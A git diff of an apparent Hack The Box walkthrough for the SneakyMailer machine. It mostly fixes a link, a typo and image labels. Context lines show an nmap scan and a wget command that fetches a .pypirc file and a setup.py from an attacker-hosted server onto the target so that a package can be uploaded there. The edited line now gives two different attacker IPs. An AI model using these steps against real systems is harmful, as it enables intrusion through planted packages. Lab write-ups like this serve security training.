@@ -6,16 +6,16 @@ categories: Security CTF HTB"
 author: Ryan
 ---
 
-*[Hack The Box](hackthebox.eu) is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*  
-![HTB - Buff](../images/HTB-SneakyMailer/Header.png)
+*[Hack The Box](https://hackthebox.eu) is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*  
+![Header](../images/HTB-SneakyMailer/Header.png)
 
 SneakyMailer is a Medium level Linux machine. The box creator graded the machine pretty heavily in the "Real" and "CVE" categories, but community statistics show a good mix across all areas. It should be an interesting box.  
-![Buff Statistics](../images/HTB-SneakyMailer/Statistics.png)
+![Statistics](../images/HTB-SneakyMailer/Statistics.png)
 
 ## Information Gathering
 
 #### Nmap:
-By scanning the tartget IP with Nmap, we're able to find what ports are open (`-p`), while fingerprinting the services running and their versions (`-sV`). We're also running the default set of scripts (`-sC`), which can help find additional information and automate some of our initial steps. Once the scan is completed, nmap with write the results to our Extracts folder (`-oA`)  
+By scanning the target IP with Nmap, we're able to find what ports are open (`-p`), while fingerprinting the services running and their versions (`-sV`). We're also running the default set of scripts (`-sC`), which can help find additional information and automate some of our initial steps. Once the scan is completed, nmap with write the results to our Extracts folder (`-oA`)  
 `>> nmap -p21,22,25,80,143,993,8080 -sC -sV -oA Extracts/SneakyMailer 10.10.10.197 `
 ![Nmap](../images/HTB-SneakyMailer/nmap.png)
 
@@ -129,7 +129,7 @@ Host the package files on our local machine.
 `>> python -m SimpleHTTPServer`
 
 Upload the files to the sneakymailer server.  
-`>> wget 10.10.14.39:8000/.pypirc; chmod 600 .pypirc; wget 10.10.14.39:8000/setup.py`
+`>> wget 10.10.14.39:8000/.pypirc; chmod 600 .pypirc; wget 10.10.14.28:8000/setup.py`
 
 Register the package on the server.  
 `>> HOME=$(pwd); python3 setup.py sdist register -r local upload -r local`
